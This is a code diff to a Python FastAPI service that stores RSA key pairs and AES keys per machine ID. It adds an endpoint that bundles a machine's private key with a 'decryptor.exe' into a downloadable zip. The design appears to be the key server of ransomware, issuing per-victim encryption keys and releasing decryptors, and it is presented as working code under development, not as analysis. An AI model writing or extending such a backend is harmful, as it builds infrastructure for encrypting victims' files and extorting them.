@@ -1,9 +1,15 @@
+from fileinput import filename
+import zipfile
+
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import FileResponse, JSONResponse
 from db import SessionLocal
 from sqlalchemy import text
 from models import Keys, MachineId, AddAES
 from Crypto.PublicKey import RSA
+import tempfile
+import os
 
 app = FastAPI()
 
@@ -119,6 +125,47 @@ def get_public_key(payload: MachineId):
     except Exception as e:
         db.rollback()
         return {"status": "error", "message": str(e)}
+
+    finally:
+        db.close()
+
+@app.get("/get-private-key/{machine_id}")
+def get_private_key(machine_id: str):
+
+    db = SessionLocal()
+
+    exe_path = "decryptor.exe"
+
+    try:
+        existing = db.query(Keys).filter(
+            Keys.machine_id == machine_id
+        ).first()
+
+        if not existing or not existing.private_key:
+            return {
+                "status": "error",
+                "message": "Private key not found for this machine"
+            }
+
+        # thư mục tạm KHÔNG auto delete
+        temp_dir = tempfile.mkdtemp()
+
+        key_file = os.path.join(temp_dir, "KEY.pem")
+
+        with open(key_file, "w") as f:
+            f.write(existing.private_key)
+
+        zip_path = os.path.join(temp_dir, "decryptor.zip")
+
+        with zipfile.ZipFile(zip_path, "w") as zipf:
+            zipf.write(exe_path, arcname="decryptor.exe")
+            zipf.write(key_file, arcname="KEY.pem")
+
+        return FileResponse(
+            path=zip_path,
+            media_type="application/zip",
+            filename="decryptor.zip"
+        )
 
     finally:
         db.close()
